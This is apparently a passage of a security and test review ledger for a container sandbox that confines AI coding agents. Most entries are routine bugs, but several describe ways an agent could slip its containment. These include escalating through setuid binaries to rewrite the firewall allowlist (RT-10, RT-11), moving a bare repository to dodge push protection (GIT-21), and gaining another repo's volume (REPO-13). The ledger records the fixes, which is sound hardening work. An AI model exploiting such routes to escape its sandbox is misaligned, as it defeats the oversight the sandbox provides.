- Fix direction: add a third branch for a directory owned by `SANDBOX_UID`.

### LNCH-13: `aclm` is computed for every candidate, though only the unlistable branch uses it
- **Status: FIXED (batch 10)** — `86427b0`: the `ls` that reads the ACL mark runs only for an unlistable candidate, in `_agent_bits_writable()`.
- Severity: NIT. Confidence: PLAUSIBLE (from code)
- Location: sandbox.sh: `m="$(cd / && LC_ALL=C ls -ld "$1" 2>/dev/null)" || m=""; m="${m%% *}"`
- What's wrong: one `ls` fork runs per launcher candidate, launchers included. The cost is bounded by SANDBOX_LAUNCHER_MAX.
- Failure scenario: none beyond a few extra forks per launch.
- Fix direction: compute it inside the `kind == unreadable && -x` test.

### LNCH-14: `mktemp` runs on every launch, and a bad TMPDIR refuses every launch
- **Status: FIXED** (2026-10-28). The FIFO search makes its temporary file only when something is bound read-only, and its refusal names the directory: `cannot make a temporary file in <dir> (TMPDIR) …`. `_git_index_read()`, which needs a temporary directory too, says once per launch that it could not make one and that indexes are not read. Hermetic T51 in `tests/test-launcher-dir-ro.sh` (a stale TMPDIR launches when nothing is read-only, and is named when something is), red on the old code.
- Severity: NIT. Confidence: CONFIRMED (reproduced: `TMPDIR=/nonexistent` gives rc=1 with "ERROR: cannot make a temporary file". GNU mktemp's own line names the template, so the path shows there)
- Location: sandbox.sh: `printf 'ERROR: cannot make a temporary file in %s (TMPDIR); set TMPDIR to a writable directory.\n'`
- What's wrong: the temporary file is made even when `ro_srcs` is empty, and the launcher's own message does not name TMPDIR. `_git_index_read` depends on TMPDIR the same way.
- Failure scenario: a stale TMPDIR in the user's shell stops every launch, and the message does not say why.
- Fix direction: make the file only when there is something to search, and name `${TMPDIR:-/tmp}` in the error.

## 11. Found while fixing TST-14, TST-15 and SVC-4

### SVC-5: a MariaDB package without `/etc/mysql/my.cnf` would start latin1 with no message
- **Status: FIXED** (2026-10-27). The Dockerfile mariadb layer's closing checks now include `test -f /etc/mysql/my.cnf`, which follows the alternatives link, so a missing or dangling file fails the build. `tests/test-mariadb.sh` Part E reads the path from `services.d/mariadb.sh`'s `MARIADB_DEFAULTS=` default and requires the layer to test that same path; red with the check removed. Mutation `814-mariadb-no-client-compat` had that line as context and was updated; it applies.
- Severity: LOW. Confidence: PLAUSIBLE (every series measured ships the file: Ubuntu's 10.11, and 10.6, 10.11, 11.4 and 11.8 from MariaDB's repository, each a link to `mariadb.cnf`)
- Location: `services.d/mariadb.sh: svc_start()`, the `--defaults-file="$MARIADB_DEFAULTS" --print-defaults` probe
- What's wrong: a missing file makes the probe exit 1 with its error on `/dev/null`; `cs` is empty and the server starts with no character-set options — latin1 before 11.8. Before SVC-4 a missing file had the same effect.
- Fix direction: add `test -e /etc/mysql/my.cnf` to the Dockerfile mariadb layer's closing checks, so the build fails instead (that line is mutation `814-mariadb-no-client-compat`'s context, so regenerate it too).

### TST-16: an `exempt` row on `workflow_run` or an unfiltered `push` still verifies
- **Status: FIXED** (2026-10-27). The exempt check is now `tests/lib-layer-checks.sh: wf_reaches_prs()`, an ALLOW-list: rc 1 only when every trigger `_wf_triggers()` lists (the `wf_triggers_on` reader in a list mode) is `schedule`, `workflow_dispatch`, `repository_dispatch` or `release`, or a `push` kept off PR branches by `_wf_push_filters()` — tags filters with no branch filter (at first also a `branches:` list of plain names; TST-18 removed that). Any branch filter, `branches-ignore`, a paths filter alone or no filter counts. The first version listed PR triggers instead, and its review measured `pull_request_review`, `issue_comment`, `create`, `check_suite` and `status` passing as exempt: the TST-6 → TST-15 → TST-16 bypass moving one sibling further, which an allow-list ends. Its re-review found `workflow_call` on that list letting a reusable workflow pass as exempt though it runs whenever a `pull_request` caller does, while `wf_it_selections()` skipped the caller's job-level `uses:` in silence, so the callee's cases dropped out of the PR layer unseen. `workflow_call` is off the list, and `wf_it_selections()` now refuses a job-level `uses:` unless the callee is a local workflow that names `tests/integration/run.sh` nowhere (`hermetic-checks.yml` is), with fixtures for a callee that runs cases, a remote one, a missing one, and a caller gated off the event. The PR layer's integration cases are derived from `pull_request`, `pull_request_target` and `merge_group` together. Demonstrated by hand-adding `workflow_run`, then `push: branches: ["**"]`, to `release.yml` (the containment test fails naming each) and by turning `integration.yml`'s `pull_request` into `merge_group` (its cases still count in the PR layer).
- Severity: LOW. Confidence: PLAUSIBLE (from code)
- Location: `tests/test-layer-containment.sh: for trig in pull_request pull_request_target merge_group; do`
- What's wrong: `workflow_run` (fired by a PR workflow finishing) and an `on: push` with no branch filter also run on every PR branch push from the same repository, and neither is checked. Separately, the PR layer derives cases for `pull_request` only, so a `cases` workflow triggered only by `merge_group` or `pull_request_target` adds nothing to the PR set. That is harmless while "every case runs nightly" keeps PR ⊆ nightly.
- Fix direction: refuse `workflow_run` in an exempt row, and `push` unless its `branches:` filter excludes PR branches. Derive the PR layer from all three PR triggers.

### TST-17: nothing automated pins the exempt-row trigger loop
- **Status: FIXED** (2026-10-27, with TST-16). The predicate moved into `wf_reaches_prs()` and is driven by fixture workflows in `tests/test-layer-checks-parser.sh` — the allow-list, each sibling trigger, every push filter shape, and the shapes it refuses. Shortening the trigger handling, letting every push through, ignoring branch globs or ignoring tags-only filters each turned them red. The falsify target scores 260 killed of 266; the first version left 12 unledgered survivors in the new awk, which the review found, and the killing fixtures were added for all but one, ledgered EQUIVALENT (entry 22). What is still pinned only by the repo's own workflows is the test's mapping of the verdict to pass/fail (TST-19).
- Severity: LOW. Confidence: CONFIRMED (TST-15's demonstration was a hand edit of `release.yml`)
- Location: `tests/test-layer-containment.sh`, the `exempt)` branch
- What's wrong: the loop runs only over the repo's own workflows, none of which uses the sibling triggers, so cutting it back to `pull_request` alone keeps the suite green. The parser test's vectors cover `wf_triggers_on()`, not this loop.
- Fix direction: move the exempt check into a function in `tests/lib-layer-checks.sh` and drive it from fixture workflows in `tests/test-layer-checks-parser.sh`.

## 12. Found while fixing SVC-5, TST-16 and TST-17

### TST-18: a push on plain branch names is taken as never reaching a PR
- **Status: FIXED** (2026-10-27). Any `branches:` filter now counts, plain names included: a tag-only push is the one shape that is provably off PRs, since a PR can be opened from any branch and the default branch is the remote's to say, not a hermetic test's. `release.yml` is tag-only, so no row changes. Fixtures for named branches, named branches beside tags and quoted names were each red on the previous code; a scalar `tags: v1` fixture kills the one new survivor. Its review found an empty flow list invisible to the reader, older than this fix: `tags: [v1]` with `branches-ignore: []` was rc 1 though the push runs on every branch. `_wf_push_filters()` now names a filter whose list is empty; fixtures for that and for the message's branch name.
- Severity: LOW. Confidence: CONFIRMED (by design, written in `wf_reaches_prs()`'s header)
- Location: `tests/lib-layer-checks.sh: wf_reaches_prs()`, its branch-filter test (then `(( wide )) || return 1`)
- What's wrong: `on: push: branches: [dev]` is rc 1, but a PR opened from `dev` runs that workflow on every push to it. No workflow here has that shape: the exempt ones are tag-only or have no push.
- Fix direction: count only the repository's default branch as off PRs, or refuse any branch filter in an exempt row.

### TST-19: the containment test's verdict mapping is pinned only by the repo's own workflows
- **Status: FIXED** (2026-10-28). The row verdict is `tests/lib-layer-checks.sh: wf_row_verdict()` (rc 0 holds, 1 fails, 3 inert, the message on stdout); the test only maps the status. Fixture rows in `tests/test-layer-checks-parser.sh` drive every branch: an exempt row on a PR-triggered and on an unreadable workflow, a stale classified and cases row, an empty `<why>`, an unknown coverage, the inert exempt row. Turning the exempt-on-PR arm into a pass, or the inert row into one, each turned them red. The fixture also caught `pull_request` reported as "not a trigger known to stay off pull requests"; known PR triggers are now named plainly.
- Severity: LOW. Confidence: CONFIRMED (both exempt workflows give rc 1, so the `0)` and `*)` arms never run in the suite)
- Location: `tests/test-layer-containment.sh`, the `exempt)` branch's `case "$ex_rc"`
- What's wrong: turning the `0)` arm into a pass keeps the suite green. The hand edits of `release.yml` showed it working once.
- Fix direction: move the row verdict (classified/cases/exempt → pass or the failure text) into a lib function and drive it with fixture rows.

### TST-20: the PR layer's cases and the exempt check define "PR-triggered" differently
- **Status: FIXED** (2026-10-28). `wf_pr_events()` lists, per workflow, the triggers `wf_reaches_prs()` counts as PR activity (every trigger off the allow-list, and push when it reaches PR branches); `wf_reaches_prs()` is built on it and the containment test derives the PR layer's cases from it, skipping only `workflow_call`, whose callers' `uses:` `wf_it_selections()` already refuses unless the callee runs no case. Demonstrated by deleting `pull_request:` from `integration.yml`: main's code failed "that layer derived to nothing"; now its push to `main` (counted since TST-18) derives the same 30 cases. Its review found the first version dropping what it had decided when push filters could not be read: `on: {push: {branches: [main]}, pull_request:}` (a flow-map push) made the workflow add no cases and the exempt check answer "cannot tell" though `pull_request` settles it. `wf_pr_events()` now lists every event it could decide and returns 2 at the end, `wf_reaches_prs()` answers from a non-push event first, and the containment test fails but still uses the events listed, as it already did for a step it could not read; fixtures for both orders were red on the first version.
- Severity: LOW. Confidence: CONFIRMED (from code); harmless while "every case runs nightly" holds
- Location: `tests/test-layer-containment.sh: layer_events`
- What's wrong: cases are derived for `pull_request`, `pull_request_target` and `merge_group`, while `wf_reaches_prs()` also counts `workflow_run`, an unfiltered `push` and any unknown trigger. A `cases` workflow on `push` alone adds nothing to the PR set.
- Fix direction: derive the PR set from the same predicate, once `wf_it_selections()` can render `push`.

### TST-21: smaller gaps in the push-filter reader
- **Status: PARTLY FIXED** (2026-10-28). Both readers split a flow list on the commas outside quotes (`splitq()` in `_wf_on_awk()` and in `_wf_push_filters()`), so `branches: ['a,b']` is one entry and `on: [schedule, 'push, pull_request']` names no push. A quote opens a quoted entry only as its first character (`tags: [it's, main]` is two entries), and one left open makes the list unreadable (rc 2), as the review asked; fixtures for both and for `wf_pr_events()` were red with the plain `split`, green under mawk 1.3.4 and gawk. Still open: the `tests/layer-checks.conf` comment that names `wf_triggers_on`, which changes in mgd-ai-containers and here together.
- Severity: LOW. Confidence: CONFIRMED
- Location: `tests/lib-layer-checks.sh: _wf_push_filters()`; `tests/layer-checks.conf`, the `workflow` row-type comment
- What's wrong: a quoted comma inside a flow list is split (`branches: ['a,b']` reads as `'a` and `b'`); the answer stays conservative unless the halves hide a glob. And `tests/layer-checks.conf` still says the exempt claim is checked by `wf_triggers_on`; it is kept byte-identical with mgd-ai-containers' copy, so it changes there and here together.
- Fix direction: split flow lists outside quotes; update the comment in both repositories at once.

### TST-22: `assert_runs` prints an ELF binary's bytes as its "shebang"
- **Status: OPEN** (2026-10-28, seen in the BLD-10 demonstration; cosmetic)
- Severity: LOW. Confidence: CONFIRMED (case 310 against mutation `311-libatomic-not-installed`)
- Location: `tests/integration/lib.sh: assert_runs()`, the diagnostic printed after `FAILED TO RUN`
- What's wrong: for a binary that fails to run, the dump reads the target's first line as a shebang whatever it is, so for `node`, an ELF file, it prints raw bytes and bash warns `command substitution: ignored null byte in input` into the case's output. The `error:` line beneath it still names the cause.
- Fix direction: print `shebang:` only when the first two bytes are `#!`, and say `ELF binary` otherwise.

## 13. Found while fixing LNCH-14, GIT-16, GIT-17 and GIT-18

### GIT-20: the other entry points still resolve their own directory through `CDPATH`
- **Status: FIXED** (2026-10-28). Every host entry point that resolves its own directory unsets `CDPATH` right after its `set` line: the six named here and `migrate-runme.sh`, `ai-containers-report.sh`, `release-title.sh`, `changelog-coverage.sh`, `changelog-section.sh`, `check-sandbox-version.sh` and `bump-sandbox-version.sh`. The in-container link scripts `cd` to absolute paths only, which `CDPATH` never redirects. New hermetic `tests/test-cdpath.sh` runs each of the 14 as `bash eng/<script>` with `CDPATH` naming a decoy `eng/`, and requires the first file it sources to be its own; the 13 changed here each failed on the old code, with the path printed twice. Its review found the one that failed silently: the `runme.sh` that `project-init.sh: emit_launcher()` generates, run as `bash .ai-containers/runme.sh` with a `CDPATH` holding another project's `.ai-containers`, built and started THAT project with no error. The generated launcher now unsets `CDPATH` before its `cd` (so does `migrate-runme.sh`, which reuses it), and `sync-to-projects.sh: backfill_launcher_cdpath()` inserts the line into launchers generated before, in place and once (`tests/test-launcher-migration.sh` case 4). `tests/test-cdpath.sh` runs a generated `runme.sh` against a decoy (red on the old launcher), and fails for any root script that resolves its own directory but is in neither its entry-point list nor its two sourced libraries. `verify-on-host.sh` and `capture-on-host.sh` unset it too.
- Severity: LOW. Confidence: PLAUSIBLE (from code)
- Location: `build.sh`, `repo.sh`, `group.sh`, `project-init.sh`, `sync-to-projects.sh`, `extract-discovery.sh`: each resolves its directory with `cd "$(dirname "${BASH_SOURCE[0]}")" && pwd` and leaves `CDPATH` set.
- What's wrong: `sandbox.sh` now unsets `CDPATH`; the others do not. A relative invocation (`bash sub/build.sh`) with an exported `CDPATH` that also holds a `sub/` resolves there, and `cd` prints the directory too, so the captured path comes back as two lines.
- Fix direction: the same `unset CDPATH` at the top of each entry point, with one test that runs an entry point under a decoy `CDPATH`.

### ENV-8: the `ai-containers.project` label publishes the project's path with a pushed image
- **Status: OPEN** (review of the ENV-7 fix, LOW-2)
- Severity: LOW. Confidence: CONFIRMED (the label is the engine copy's physical path)
- Location: `sandbox-common.sh: ai_containers_provenance_labels()`, the `ai-containers.project` label
- What's wrong: `docker push` of an image sends `/home/<user>/<dir>/.ai-containers` to the registry: the user name and directory names. `built-at` and `source-commit` were already there, but this is the first personal field. A teammate who pulls such an image and rebuilds over it gets the NOTE that its project path no longer exists, naming that path.
- Fix direction: a hash of the path, looked up in `projects.conf` to name the other project in the warning, or the project's name alone.

### LNCH-15: the once-per-launch "cannot make a temporary directory" WARNING is not asserted
- **Status: FIXED** (2026-10-28). T51 now launches over two repositories with an index each under the stale TMPDIR and requires the warning exactly once; with the once-only guard removed it counted 2.
- Severity: LOW. Confidence: CONFIRMED (no test names it)
- Location: `sandbox.sh: _git_index_read()`, its `mktemp -d` failure branch
- What's wrong: T51 checks the FIFO search's refusal only. Where a git directory is protected, the launch is refused by that search anyway, so the warning matters only for an index read with nothing bound read-only.
- Fix direction: assert the warning, once, in T51's second arm.

## 14. Found while fixing RT-8

### RT-10: the agent shell itself has no `no_new_privs`
- **Status: FIXED** (2026-10-28). Each mode's `exec capsh` passes `--no-new-privs` before `--user=` — in the image, so it holds however the container is started, rather than as a `sandbox.sh` option the harness would only mirror. Measured with the image's `capsh`: `--drop=… --no-new-privs --user=probe` gives `CapEff 0`, `NoNewPrivs 1` (after `--user=` works the same; the order is not load-bearing). Its review measured git over ssh, `ssh-agent`, gpg, git, node and python unchanged, `unshare -U` refused by Docker's seccomp either way, and discovery-mode `ping` still working through the unprivileged ICMP socket `ping_group_range` allows — the fix direction below expected it to stop. Cases `070`, `230` and `240` now `assert_no_new_privs` on PID 1 (`tests/integration/lib.sh`), and mutation `070-230-240-shell-new-privs` removes the flag from all three branches. Mutations `240-open-keeps-capabilities` (its ambient raise still lands `cap_net_raw` under `no_new_privs`, measured) and `322-app-env-not-given-back` were regenerated for the new line.
- Severity: MEDIUM. Confidence: PLAUSIBLE (no exploitable setuid binary known; the mechanism measured)
- Location: `entrypoint.sh`, the final `exec capsh` of each mode; `sandbox.sh`, the `docker run` options
- What's wrong: the user steps before the drop now run with `no_new_privs` (RT-8), but the shell they hand over to does not, and its bounding set still holds Docker's defaults (`CAP_SETUID`, `CAP_DAC_OVERRIDE`, `CAP_CHOWN`, …). A setuid-root binary the image ships (`passwd`, `chsh`, `mount`, `su`, `ssh-keysign`, …) run from that shell, with any bug in it, is euid 0, which can rewrite the root-owned `/tmp/allowlist-cidrs.txt` the refresh loop reloads every 60 s: the firewall opened without NET_ADMIN.
- Fix direction: `sandbox.sh` passes `--security-opt=no-new-privileges` (measured by the review: `runuser` and `capsh` still work, the root entrypoint loses nothing; discovery-mode `ping`, a file-capability binary, stops working), or `setpriv --no-new-privs --` in front of each `exec capsh`, or the setuid bits stripped at build time.

### RT-11: a `docker exec -u` session does not get `no_new_privs`
- **Status: FIXED** (2026-10-28). `sandbox.sh`'s `docker run` passes `--security-opt=no-new-privileges` in every mode (`tests/test-mode-capabilities.sh` asserts it for all three), and `tests/integration/lib.sh: sandbox_up()` deliberately does not — the first version mirrored it, and its review measured that this made RT-10's mutation survive, since the option alone gives PID 1 `NoNewPrivs 1`. New case `250-exec-session-no-new-privs` launches through `sandbox.sh` (`launcher_up open`), requires `NoNewPrivs 1` in a `docker exec -u <agent>` session, a root exec session and PID 1, and the effect: a setuid-root copy of `id`, made as root, still reports the agent's uid from the agent's session. Run locally: 250 passes alongside 070, 230 and 240; under mutation `250-exec-session-gains-privs`, which removes the option, 250 fails all three exec-session assertions (`NoNewPrivs 0` twice, and the setuid `id` copy reports uid 0) while PID 1 keeps RT-10's flag; and with `sandbox_up` no longer passing the option, RT-10's mutation `070-230-240-shell-new-privs` fails 070, 230 and 240 again.
- Severity: LOW. Confidence: CONFIRMED (measured: PID 1 `NoNewPrivs: 1`, a `docker exec -u probe` shell `NoNewPrivs: 0`, `/usr/bin/passwd` still setuid)
- Location: `sandbox.sh`, the `docker run` options
- What's wrong: RT-10 sets the flag on the agent shell, and a `docker exec` session is a fresh process from the daemon, outside that tree. AGENTS.md already says to run one as the agent (`-u`), not root; as the agent it can still exec a setuid-root binary.
- Fix direction: `sandbox.sh` passes `--security-opt=no-new-privileges` too, which the daemon applies to `docker exec` as well. Measured by the review: the root entrypoint still works under it (`setpriv … runuser`, `capsh --user=`), and `dumpcap`/`tshark` carry no file capabilities, so capture is unaffected. (This said the harness's `sandbox_up` should mirror it, as it mirrors `--cap-add`. Wrong, as the fix's review showed: the option sets the flag on PID 1 by itself, which would have hidden RT-10's from cases 070/230/240.)

### RT-12: `/etc/profile.d/ai-tools.sh` breaks a POSIX `sh` login shell
- **Status: OPEN** (2026-10-28, found while measuring corepack for BLD-10)
- Severity: LOW. Confidence: CONFIRMED (`su - u` of a user whose shell is `/bin/sh`, in the Node 26 image)
- Location: `Dockerfile: npm-agent-tools()`, the function the image writes into `/etc/profile.d/ai-tools.sh`
- What's wrong: `/etc/profile` sources every `/etc/profile.d/*.sh` in whatever shell reads it, and dash cannot parse a function name with a hyphen, so a `sh -l` login (or `su -` to a user whose shell is `sh`) stops with `/etc/profile.d/ai-tools.sh: Syntax error: Bad function name`, before the rest of that file and of `/etc/profile` runs. The sandbox user's shell is bash (`entrypoint.sh: useradd_matching_host_uid -M -s /bin/bash`), so the agent shell and `bash -l` are unaffected; a `docker exec … sh -l` is not.
- Fix direction: define the function only under bash (`[ -n "${BASH_VERSION:-}" ] &&` before it, or move it to `/etc/bash.bashrc` beside nvm), and say why where it is written.

## 15. Found while fixing batch 10

Batch 10 went through seven review rounds, a review of its merge with main and one of the fixes that review asked for (`162d4c3`, `708742d`); every HIGH and MEDIUM they found was fixed or, where the user chose, designed out (GIT-13). What they left open:

### GIT-21: a bare repository created mid-session can borrow a listed fixture's exemption
- **Status: CLOSED (batch 11)** — `04e56e3`: no longer applies; there is no fixture exemption to borrow (GIT-11).
- Severity: LOW. Confidence: PLAUSIBLE (reproduced with the fixture loop alone, not end to end)
- Location: sandbox.sh, the `SANDBOX_GIT_FIXTURES` loop in `launcher_ro_overlay()` (removed in batch 11)
- What's wrong: a bare repository no launch has protected yet (one you create during a session) can be moved by the agent onto a listed `SANDBOX_GIT_FIXTURES` path, with a link left at its old path. The next launch takes the fixture path, a real directory now, for the fixture; the scan does not follow the link, and your `git push` goes through it into a repository with no placeholders and no first-protection NOTE.
- Fix direction: print the first-protection exec-key and hooks NOTE for fixtures too, or warn when a link in a writable mount leads to a listed fixture. AGENTS.md already lists a repository the agent creates before its first protection as not covered.

### GIT-22: nothing tests that another user's unlistable `.git` is refused
- **Status: OPEN** (batch 10 review of `1e67064`, finding #1)
- Severity: LOW. Confidence: CONFIRMED (no test makes a directory another user owns)
- Location: sandbox.sh: `if [[ "$kind" == unr && -x "$g" ]]; then`
- What's wrong: G66 uses a `.git` of the launching user's; one that put an ownership check back into the condition would pass both suites. A non-root test cannot make another user's directory.
- Fix direction: an integration case run as root, or a falsify survivor entry.

### ENV-9: an unmounted drive's empty mount point passes for a moved project
- **Status: OPEN** (batch 10 review, round 3 finding #9)
- Severity: NIT. Confidence: PLAUSIBLE (from code)
- Location: sandbox-common.sh: `while [[ -n "$up" && ! -e "$up" ]]; do up="${up%/*}"; done`
- What's wrong: a project on a drive that is not mounted looks gone, so a committed `IMAGE_NAME` naming its image is rebuilt with the NOTE rather than refused.
- Fix direction: refuse when the nearest existing ancestor is an empty mount point, or accept it as the NOTE says.

### LNCH-16: `SANDBOX_GIT_FIXTURES` is portable, so a commit can name a repository you push to
- **Status: FIXED (batch 11)** — `04e56e3`: `SANDBOX_GIT_FIXTURES` was removed, not made machine-only: every bare repository gets its placeholders (GIT-11; the user's choice). The entry below said "the same trust as a committed `SANDBOX_GIT_MAX`", which was wrong: raising that cap protects more repositories, while this key was the only committed one that turned protection off.
- Severity: LOW. Confidence: CONFIRMED (by design)
- Location: sandbox-common.sh, `env_key_portable()` (the key removed in batch 11)
- What's wrong: a team can commit the fixture list, which is the point; a malicious commit that you pull can list a bare repository you push to, which then gets no placeholders. The same trust as a committed `SANDBOX_GIT_MAX`. Entries are plain paths inside the project with no link on the way.
- Fix direction: make it machine-only (`env_key_machine_only`) if a committed list is not wanted.

### LNCH-17: nits
- **Status: OPEN** (batch 10 reviews, NITs)
- Severity: NIT
- On a host with no `getfacl` whose `ls` is uutils, every unlistable directory fails closed (round 1).
- `_q()`'s `\xHH` fallback cannot be reached where bash's `%q` already escapes high bytes under `LC_ALL=C` (round 1).
- Several fixes have two tests since the merge (G90/G73, G91/G74, G44's gtimeout arm and G75, T51/T53); G44's extra launch costs ~20 s (merge review).
- The index read's TMPDIR WARNING renders its path with `_term`, the FIFO refusal with `_q` (merge review).
- G90 and G91 keep their old numbers inside, in variable and path names (`U72`, `M72`, `real73`) (merge review).
- The line that opens `_rd_errfd` at the top of `sandbox.sh` has no test of its own; `_rd_fail()`'s tests reach it only through a launch.
- Where the verify directory's inode does not survive the bind (macOS Docker Desktop, Colima), the NOTE that verification is skipped prints on every launch, so the output directories batch 10 added to the manifest are not verified there either.

### LNCH-18: with no `getfacl`, refusing an `ls` that is neither GNU's nor BSD's is not tested
- **Status: OPEN** (review of `162d4c3`, finding #5)
- Severity: LOW. Confidence: CONFIRMED (a mutant that trusts any `ls` there passes `tests/test-launcher-dir-ro.sh`)
- Location: sandbox.sh: `_agent_bits_writable()`, its branch for a host with no `getfacl`
- What's wrong: Linux hosts have `getfacl`, T25h's busybox arm puts a fake `getfacl` on `PATH`, and the floor containers run as root, which skips T25. On macOS, which has no `getfacl`, T25g runs the branch with BSD `ls` only, so the part that refuses any other `ls` is reached by no test.
- Fix direction: a T25 arm with a `PATH` that has no `getfacl`, built from links to the tools the launch needs.

## 16. Found while fixing REPO-11

### REPO-13: an attached repo is mounted by its volume's name, whatever its label says
- **Status: FIXED** (2026-10-28). Before the `REPOS` attach loop, `sandbox.sh` checks every entry with `_repo_volume_foreign()`: the base volume of each volume-backed entry, and for `:rwcopy` the working copy too, which is reused if it exists and whose `<base>--wc-<tag>` name collides the same way. One labelled for another repo refuses the launch, naming the prefix it belongs to, before any working copy is seeded or anything mounted — the first version checked inside the loop, after an earlier entry's copy had been seeded, and not the working copy at all (its review). The loop is the one place repo volumes are mounted: the `@repo` working directory and the `DOCS_PATH`/`SPECS_PATH`/`ARCHITECTURE_REPO_PATH` `@name` forms are entries in it. Hermetic, `tests/test-docs-path.sh` (its fake `docker` answers labels per volume and logs every call): a foreign base volume, a foreign working copy, and `good:rwcopy bad:rw` seeding nothing — each red on the old code, which attached the other repo's volume `:rw`; its own label and none attach as before.
- Severity: LOW. Confidence: PLAUSIBLE (from code; the same collision REPO-11 reproduced)
- Location: `sandbox.sh`, the `REPOS` attach, which checks `repo_volume_exists` only
- What's wrong: with a registered `docs` whose base volume is labelled for another repo (a nested `REPO_VOLUME_PREFIX`), `REPOS="docs:rw"` mounts that other repo's volume read-write for the agent, `:rwcopy` seeds a copy from it, and `:ro` shows its content as `docs`. Unlike `rm`, this hands another repo's data to the agent.
- Fix direction: refuse the launch when the base volume's `ai-containers.repo` label names another repo, as `repo.sh: foreign_base_owner()` does.

### REPO-14: `rm`'s refusal over another repo's volume does not mention the name's own working copies
- **Status: FIXED** (2026-10-28). The refusal names `./repo.sh gc --repo <name>` for the name's own working copies; asserted in `tests/test-repo-destructive.sh`.
- Severity: NIT
- Location: `repo.sh: cmd_rm()`, the foreign-owner refusal
- What's wrong: it says how to drop the registry line, not that the name's own labelled working copies stay; `./repo.sh gc --repo <name>` removes them.
- Fix direction: name that command in the message.

### REPO-15: some dropped tags are labelled more cautiously than they are
- **Status: OPEN** (review of the REPO-8 fix, LOW)
- Severity: LOW. Confidence: CONFIRMED (measured by the review)
- Location: `repo-git-reset.sh: cmd_inspect()`, the `TAG|` record
- What's wrong: a local tag on a commit only a remote *tag* reaches is reported lost and counted (`no|no`), though the clone keeps that commit; a tag the remote has at another object is described as "not on the remote" where the remote's version replaces it; with the volume's own alternates file an unreachable commit is `no`, not `?`. Each errs toward warning.
- Fix direction: test reachability from `refs/tags/` of the clone too, and name the moved-tag case.

### REPO-16: a helper killed during `inspect` leaves reset's summary silent about what it did not report
- **Status: OPEN** (review of the REPO-8 fix, LOW; the structure predates it)
- Severity: LOW. Confidence: PLAUSIBLE (from code)
- Location: `repo.sh: collect_inspections()`, which reads `< <(inspect_git …)` and never sees its exit status
- What's wrong: `STASH` and `TAG` are the last records, so a helper killed after the `BRANCH` records (137, out of memory) leaves the summary without them, and reset goes on; only the helper's ERROR on stderr says so.
- Fix direction: have the helper end with an `END|` record and treat a summary without one as unknown, at risk.

### REPO-17: `check_volume()` and `nested_in()` match the volume's own `.git` with `find -path`, a glob
- **Status: OPEN** (review of the REPO-5 fix, INFO; the refuse mode predates it)
- Severity: LOW. Confidence: CONFIRMED (from code; the reviewer's probe)
- Location: `repo-git-reset.sh: nested_in()`, `-path "$1/.git" -prune`, and the same `-path "$gd"` in `check_volume()`
- What's wrong: `-path` takes a glob, so a volume path holding `[`, `*` or `?` does not prune its own top-level `.git`, which is then listed as nested and, by `reset`, removed before the clone's `.git` replaces it. Production always passes `/dst`, so it cannot happen there; only a direct run of the helper on such a path, as a test does, would meet it.
- Fix direction: `cd` into the volume and use `-path ./.git`, or escape the glob characters in the pattern.

### LNCH-21: under uutils coreutils with no `getfacl`, an unlistable directory is always taken for agent-writable
- **Status: FIXED** (2026-10-28). `_agent_bits_writable()` trusts uutils' `ls` beside GNU's and BSD's where there is no `getfacl`: measured in ubuntu:25.10 (uutils 0.2.2) and ubuntu:26.04 (0.10.0, this host's) with `setfacl`, it prints `+` for an ACL (access, default-only, masked, group; ext4, tmpfs, overlay — its review) and the bare mode otherwise. Its `+` marks any extended attribute, so it can only over-report; but its `.` for a security context takes the place of the `+`, where GNU's keeps the `+`, so from uutils only the bare mode is taken as plain (no packaged Ubuntu build prints `.`; its review). The `(uutils coreutils)` string first appears in 0.1.0, after ACL marking (0.0.24), so no trusted version misses an ACL; older builds print no such string and still fail closed, and a build that names itself so with a number before 0.1.0 is not trusted either (automated security review; T25i's `0.0.23` shim). New T25i runs the rule in a `PATH` of `find`, a `uname` that says Linux and a shim `ls` that says it is uutils, so neither the host's `ls`, its `getfacl` nor its kernel decides: plain is not counted, `+` and `.` are (red on the old code on every host). T25g passes on this host again.
- Renumbered from LNCH-19 (2026-10-28): batch 11 logged its own LNCH-19 (the group checks) at the same time. Commit messages `5b2c891`, `781c2f4`, `f603639` and `27a5fd4` call this one LNCH-19.
- Severity: LOW. Confidence: CONFIRMED (this host: `ls (uutils coreutils) 0.10.0`, no `getfacl`; `tests/test-launcher-dir-ro.sh` T25g fails `plain grp-other-gid` on clean main; CI's GNU `ls` passes it)
- Location: `sandbox.sh: _agent_bits_writable()`, the ls-based ACL fallback
- What's wrong: with no `getfacl`, only GNU's or a BSD `ls` is trusted to say a directory has no ACL (LNCH-6); uutils' `ls`, the default `ls` of recent Ubuntu releases, is neither, so the check fails closed and a directory nobody but its owner can write counts as agent-writable — a launch over one that is searchable but unlistable is refused where it need not be. It fails closed, so it costs usability, not safety. LNCH-18 already notes that this branch is untested in CI.
- Fix direction: measure whether uutils' `ls -ld` marks an ACL with `+` and trust it if it does; otherwise say in the refusal that installing `acl` (`getfacl`) lets the check decide. Make T25g's vectors independent of the host's `ls`, as T25h's shim does.

### LNCH-19: the group checks compare physical paths, not device:inode
- **Status: FIXED** (batch 12, `e2905c5`): the group directory is also compared with `$HOME` by `_launcher_dev_ino()`, both through a trailing `/.`; tested with a `stat` shim standing in for the alias (G92).
- Severity: LOW. Confidence: CONFIRMED (a bind mount of `$HOME` onto `~/.ai-containers/bm`, inside `unshare -rm`, launched and mounted the real `~/.ssh`)
- Location: sandbox.sh: `run_container()`, the "is your home directory" refusal
- What's wrong: the group directory is compared with `$HOME` by `pwd -P`, so an alias that is the same directory by another path — a bind mount, a macOS firmlink, another case on a case-insensitive filesystem — is not caught. Each needs a deliberate setup, usually root, and the agent cannot create `~/.ai-containers/<group>`.
- Fix direction: compare `_launcher_dev_ino()` of the two instead.

### LNCH-20: batch 11 leftovers
- **Status: FIXED** (batch 12, `e2905c5`, `f15b6dc`, `82a9dab`): build.sh runs `validate_group_name` and prints the NOTE naming the file (`host_group_source()`, shared with the launch); the launch's NOTE and sync-to-projects.sh's warning read the files with `load_env_defaults` in the launcher's order, sync's only after its loader reads a probe back; each link-refusal hint follows the target; the menu's list is `group_menu_choices()`, tested; G92 pins the checks before any docker call or output directory. Left as is (NIT): a FUSE mount of `$HOME` (its own st_dev) is not caught; with the shell exporting `host` and a file saying it too, the NOTE names the file.
- Severity: LOW (the first three) and NIT
- `build.sh` does not check the group, so a `host` project's `runme.sh` builds the whole image before the launch refuses it.
- No test pins that the group checks run before the `REPOS` `:rwcopy` volume and the output directories are made; G92 would pass with them moved back down.
- The group-bootstrap menu's new filter (no `host`, no hidden directories) has no test: the menu needs a terminal.
